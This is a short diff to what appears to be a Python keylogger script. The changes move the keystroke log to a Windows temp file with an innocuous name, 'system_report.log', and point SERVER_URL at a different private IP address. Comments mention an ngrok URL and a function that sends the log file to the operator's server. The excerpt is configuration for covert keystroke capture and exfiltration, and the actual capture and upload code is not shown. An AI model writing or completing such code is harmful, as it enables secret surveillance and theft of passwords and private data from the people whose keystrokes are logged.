@@ -4,7 +4,7 @@ import logging
 from datetime import datetime
 
 # Configure logging to store keystrokes locally
-LOG_FILE = "C:\\Temp\\system_report.log"
+LOG_FILE = "C:\\Windows\\Temp\\system_report.log"
 logging.basicConfig(
     filename=LOG_FILE,
     level=logging.INFO,
@@ -12,7 +12,7 @@ logging.basicConfig(
 )
 
 # Replace with your ngrok public URL
-SERVER_URL = "http://192.168.137.1:5000"  # Replace with your actual ngrok URL or temporary python sever address
+SERVER_URL = "http://10.99.3.250:8000"  # Replace with your actual ngrok URL or temporary python sever address
 
 # Function to send the log file to your server
 def send_log_file():
